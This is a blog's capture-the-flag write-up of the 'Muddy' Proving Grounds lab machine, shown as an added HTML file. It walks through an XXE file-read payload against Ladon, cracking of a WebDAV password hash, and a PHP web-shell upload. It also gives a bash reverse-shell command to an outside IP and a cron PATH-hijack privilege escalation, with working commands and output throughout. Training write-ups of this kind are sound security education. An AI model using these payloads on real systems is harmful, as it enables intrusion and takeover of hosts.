@@ -1,0 +1,172 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Muddy - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary of ResultRemote enumeration discloses a XML External Entity (XEE) vulnerability of ladon running on a higher port of a web application. Misusing XEE ...
+    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/muddy-ospg/"><meta property="og:description" content="
+    Blog"><meta property="og:title" content="Muddy - OSPG
+  "><link rel="canonical" href="https://jayngng.github.io/blog/muddy-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Muddy - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 02, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i> Tags:  | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 8 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary of Result</strong></h1><p>Remote enumeration discloses a <code class="language-plaintext highlighter-rouge">XML External Entity (XEE)</code> vulnerability of <code class="language-plaintext highlighter-rouge">ladon</code> running on a higher port of a web application. Misusing <code class="language-plaintext highlighter-rouge">XEE</code> to read a configuration file, which bears credentials of <code class="language-plaintext highlighter-rouge">webdav</code> service. With the credentials, we can exploit <code class="language-plaintext highlighter-rouge">authenticated WebDav file upload</code> to secure an initial access. We then escalate our privilege by leveraging <code class="language-plaintext highlighter-rouge">path hijacking</code> vulnerability of a misconfigured <code class="language-plaintext highlighter-rouge">crontab</code>.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap">Nmap</h4><p>We will begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> nmap/services <span class="nv">$IP</span>
+PORT     STATE SERVICE       REASON         VERSION 
+22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:  
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkD
+neyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I
+2r                        
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA<span class="o">=</span>
+|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
+25/tcp   open  smtp          syn-ack ttl 63 Exim smtpd
+| smtp-commands: muddy Hello nmap.scanme.org <span class="o">[</span>192.168.49.69], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods:                      
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Did not follow redirect to http://muddy.ugc/
+111/tcp  open  rpcbind       syn-ack ttl 63 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+443/tcp  open  tcpwrapped    syn-ack ttl 63
+808/tcp  open  ccproxy-http? syn-ack ttl 63
+908/tcp  open  unknown       syn-ack ttl 63
+8888/tcp open  http          syn-ack ttl 63 WSGIServer 0.1 <span class="o">(</span>Python 2.7.16<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: WSGIServer/0.1 Python/2.7.16
+|_http-title: Ladon Service Catalog
+</code></pre></div></div><ul><li>There are a few open services, the web application running on port 8888 is our concentration.</li></ul><p><br></p><h4 id="http8888"><strong>HTTP/8888</strong></h4><p>From the <code class="language-plaintext highlighter-rouge">nmap</code> result, we notice that the server is employing <code class="language-plaintext highlighter-rouge">Ladon Service Catalog</code>, we can obtain the same info with <code class="language-plaintext highlighter-rouge">curl</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://muddy.ugc:8888/                                                                                                                                                        1 ⚙
+
+...
+
+                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"catName"</span><span class="o">&gt;</span>Ladon Service Catalog&lt;/div&gt;
+              
+...
+
+                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"catGen"</span><span class="o">&gt;</span>Powered by Ladon <span class="k">for </span>Python&lt;/div&gt;
+        &lt;/body&gt;
+&lt;/html&gt; 
+</code></pre></div></div><p>Further enumeration reveals that <code class="language-plaintext highlighter-rouge">muddy</code> is the only one service run by <code class="language-plaintext highlighter-rouge">Ladon</code>. To access the service, we navigate to <code class="language-plaintext highlighter-rouge">/muddy</code> directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://muddy.ugc:8888/muddy | html2text                                                                                                                                       1 ⚙
+muddy
+skins: <span class="o">[</span>One of: Default/Bluebox/Rounded]
+Service Description:
+None
+Available Interfaces:
+    <span class="k">*</span> xmlrpc <span class="o">[</span> url description <span class="o">]</span>
+    <span class="k">*</span> jsonrpc10 <span class="o">[</span> url description <span class="o">]</span>
+    <span class="k">*</span> jsonwsp <span class="o">[</span> url description <span class="o">]</span>
+    <span class="k">*</span> soapdocumentliteral <span class="o">[</span> url description <span class="o">]</span>
+    <span class="k">*</span> soap11 <span class="o">[</span> url description <span class="o">]</span>
+    <span class="k">*</span> soap <span class="o">[</span> url description <span class="o">]</span>
+Methods:
+    <span class="k">*</span> checkout <span class="o">(</span>  string  uid <span class="o">)</span>
+      None
+      Paramters:
+          o uid:  string
+            None
+      Returns:  string
+      None
+Types:
+Powered by Ladon <span class="k">for </span>Python
+</code></pre></div></div><p>It’s worth taking note of the method <code class="language-plaintext highlighter-rouge">checkout</code> and the service <code class="language-plaintext highlighter-rouge">muddy</code>, since they might be useful later on.</p><p><br></p><h4 id="xee-ladon"><strong>XEE Ladon</strong></h4><p>With a few investigations, we discover that <code class="language-plaintext highlighter-rouge">ladon</code> is vulnerable to XEE.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit ladon  
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                              |  Path
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Ladon Framework <span class="k">for </span>Python 0.9.40 - XML External Entity Exp | xml/webapps/43113.txt
+<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div><p>Using the exploit payload found in the above PoC, we modify:</p><ul><li>the method to <code class="language-plaintext highlighter-rouge">checkout</code> instead of <code class="language-plaintext highlighter-rouge">sayhello</code>.</li><li>the service to <code class="language-plaintext highlighter-rouge">muddy</code> instead of <code class="language-plaintext highlighter-rouge">HelloService</code>.</li></ul><p>Let’s us try to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p><ul><li>The request might look as follows.</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">-H</span> <span class="s1">$'Content-Type: text/xml;charset=UTF-8'</span> <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">-H</span> <span class="s1">$'SOAPAction: </span><span class="se">\"</span><span class="s1">http://muddy.ugc:8888/muddy/soap11/checkout</span><span class="se">\"</span><span class="s1">'</span> <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">--data-binary</span> <span class="s1">$'&lt;?xml version="1.0"?&gt;
+quote&gt; &lt;!DOCTYPE uid
+[&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+quote&gt; &lt;soapenv:Envelope xmlns:xsi=</span><span class="se">\"</span><span class="s1">http://www.w3.org/2001/XMLSchema-instance</span><span class="se">\"</span><span class="s1">
+quote&gt; xmlns:xsd=</span><span class="se">\"</span><span class="s1">http://www.w3.org/2001/XMLSchema</span><span class="se">\"</span><span class="s1">
+
+quote&gt; xmlns:soapenv=</span><span class="se">\"</span><span class="s1">http://schemas.xmlsoap.org/soap/envelope/</span><span class="se">\"</span><span class="s1">
+quote&gt; xmlns:urn=</span><span class="se">\"</span><span class="s1">urn:muddy</span><span class="se">\"</span><span class="s1">&gt;&lt;soapenv:Header/&gt;
+quote&gt; &lt;soapenv:Body&gt;
+quote&gt; &lt;urn:checkout soapenv:encodingStyle=</span><span class="se">\"</span><span class="s1">http://schemas.xmlsoap.org/soap/encoding/</span><span class="se">\"</span><span class="s1">&gt;
+&lt;uid xsi:type=</span><span class="se">\"</span><span class="s1">xsd:string</span><span class="se">\"</span><span class="s1">&gt;&amp;passwd;&lt;/uid&gt;
+quote&gt; &lt;/urn:checkout&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</span> <span class="se">\</span>
+<span class="o">&gt;</span> <span class="s1">'http://muddy.ugc:8888/muddy/soap11'</span> | xmllint <span class="nt">--format</span> -
+</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> will be included in a response if our code successfully executes.</p><ul><li>Here is the response.</li></ul><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;SOAP-ENV:Body</span> <span class="na">SOAP-ENV:encodingStyle=</span><span class="s">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;ns:checkoutResponse&gt;</span>
+      <span class="nt">&lt;result&gt;</span>Serial number: 
+	  [...]
+	  
+	  ian:x:1000:1000::/home/ian:/bin/sh
+	  
+	  [...]
+	  <span class="nt">&lt;/result&gt;</span>
+    <span class="nt">&lt;/ns:checkoutResponse&gt;</span>
+  <span class="nt">&lt;/SOAP-ENV:Body&gt;</span>
+<span class="nt">&lt;/SOAP-ENV:Envelope&gt;</span>
+</code></pre></div></div><p>Perfect! From the enumeration phase, we also recognized a <code class="language-plaintext highlighter-rouge">webdav</code> service running on port 80.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://muddy.ugc/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt
+
+...
+index.php               <span class="o">[</span>Status: 200, Size: 19195, Words: 860, Lines: 351]
+javascript              <span class="o">[</span>Status: 301, Size: 321, Words: 20, Lines: 10]
+server-status           <span class="o">[</span>Status: 403, Size: 279, Words: 20, Lines: 10]
+webdav                  <span class="o">[</span>Status: 401, Size: 461, Words: 42, Lines: 15]
+wp-admin                <span class="o">[</span>Status: 301, Size: 319, Words: 20, Lines: 10]
+wp-content              <span class="o">[</span>Status: 301, Size: 321, Words: 20, Lines: 10]
+wp-includes             <span class="o">[</span>Status: 301, Size: 322, Words: 20, Lines: 10]
+xmlrpc.php              <span class="o">[</span>Status: 405, Size: 42, Words: 6, Lines: 1]
+</code></pre></div></div><p>Now, we can try to read <code class="language-plaintext highlighter-rouge">webdav</code> configuration file to retain the admin credentials.</p><p>With the XEE vulnerability we have spotted earlier, adjust the file from <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to <code class="language-plaintext highlighter-rouge">/var/www/html/webdav/passwd.dav</code>.</p><p>Primarily, our command is completely similar but the payload.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+...
+<span class="o">[</span>&lt;<span class="o">!</span>ENTITY passwd SYSTEM <span class="s2">"file:///var/www/html/webdav/passwd.dav"</span><span class="o">&gt;</span>
+...
+      &lt;result&gt;Serial number: administrant:<span class="nv">$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</span>&lt;/result&gt;
+...
+</code></pre></div></div><p>The encrypted password can then be cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 1600 <span class="nt">-a</span> 0 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+<span class="o">[</span>...]
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344392                         
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385                         
+<span class="k">*</span> Runtime...: 1 sec                            
+
+<span class="nv">$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</span>:sleepless
+</code></pre></div></div><p>The cracked credentials is <code class="language-plaintext highlighter-rouge">administrant:sleepless</code>, which we abuse to bypass <code class="language-plaintext highlighter-rouge">webdav</code> login prompt.</p><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="webdav-file-upload"><strong>WebDav File Upload</strong></h4><p>To upload a malcious shell, we use <code class="language-plaintext highlighter-rouge">curl</code>.</p><p>[1]. Upload a malicious <code class="language-plaintext highlighter-rouge">.txt</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>cmback.txt
+&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'1'</span><span class="o">]</span><span class="p">;</span> <span class="o">)</span>?&gt;
+<span class="nv">$ </span>curl <span class="nt">-u</span> administrant:sleepless <span class="nt">-T</span> <span class="s1">'cmback.txt'</span> <span class="s1">'http://muddy.ugc/webdav/'</span>
+...
+&lt;title&gt;201 Created&lt;/title&gt;
+...
+</code></pre></div></div><p>[2]. Move the <code class="language-plaintext highlighter-rouge">.txt</code> extention to <code class="language-plaintext highlighter-rouge">.php</code> extention.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> MOVE <span class="nt">--header</span> <span class="s1">'Destination:http://muddy.ugc/webdav/cmback.php'</span> <span class="s1">'http://muddy.ugc/webdav/cmback.txt'</span> <span class="nt">-u</span> administrant:sleepless
+...
+&lt;title&gt;201 Created&lt;/title&gt;
+...
+</code></pre></div></div><p><code class="language-plaintext highlighter-rouge">201 Created</code> code means both operations are successful. Next, we try to trigger the code.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-u</span> administrant:sleepless <span class="nt">-s</span> http://muddy.ugc/webdav/cmback.php<span class="se">\?</span><span class="nv">1</span><span class="o">=</span><span class="nb">whoami                                                                                                        </span>1 ⚙
+www-data
+</code></pre></div></div><p>and boom! → Remote Code Execution (RCE)!</p><p>Let’s us pull a <code class="language-plaintext highlighter-rouge">bash</code> reverse shell.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -c <span class="se">\"</span>bash -i &gt;&amp; /dev/tcp/192.168.49.227/80 0&gt;&amp;1<span class="se">\"</span>
+</code></pre></div></div><p>It’s always a good idea to URL-encode the payload.</p><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
+</code></pre></div></div><p>The final command is:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-u</span> administrant:sleepless <span class="nt">-s</span> http://muddy.ugc/webdav/cmback.php<span class="se">\?</span><span class="nv">1</span><span class="o">=</span>bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
+</code></pre></div></div><p>After executed, our <code class="language-plaintext highlighter-rouge">nc</code> should catch the reverse shell at port 80 as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 80     
+listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>192.168.49.227] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.227.161] 55638
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>574<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@muddy:/var/www/html/webdav<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="crontab"><strong>Crontab</strong></h4><p>Locally gather the target system divulges a vulnerable <code class="language-plaintext highlighter-rouge">crontab</code> service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@muddy:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+...
+
+<span class="k">*</span>  <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    netstat <span class="nt">-tlpn</span> <span class="o">&gt;</span> /root/status <span class="o">&amp;&amp;</span> service apache2 status <span class="o">&gt;&gt;</span> /root/status <span class="o">&amp;&amp;</span> service mysql status <span class="o">&gt;&gt;</span> /root/status
+</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">netstat ...</code> command is orderly defined in the <code class="language-plaintext highlighter-rouge">PATH</code> environment.</p><p>It’s worth noticing that we have a full control over the <code class="language-plaintext highlighter-rouge">/dev/shm</code> path, where cronjob will navigate to and execute its command.</p><p>At this point, we can inject a malicious <code class="language-plaintext highlighter-rouge">netstat</code> shell, which then executes commands of our choices as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@muddy:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"chmod +s /bin/bash"</span> <span class="o">&gt;</span> /dev/shm/netstat
+www-data@muddy:~<span class="nv">$ </span><span class="nb">chmod </span>777 /dev/shm/netstat
+</code></pre></div></div><p>After a minute, the <code class="language-plaintext highlighter-rouge">/bin/bash</code> command is dressed up with a SUID bit, we then run</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@muddy:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">whoami
+</span>root
+</code></pre></div></div><p>and become root!</p><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with <a href="https://jekyllrb.com" target="_blank">Jekyll</a> using <a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a> Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>
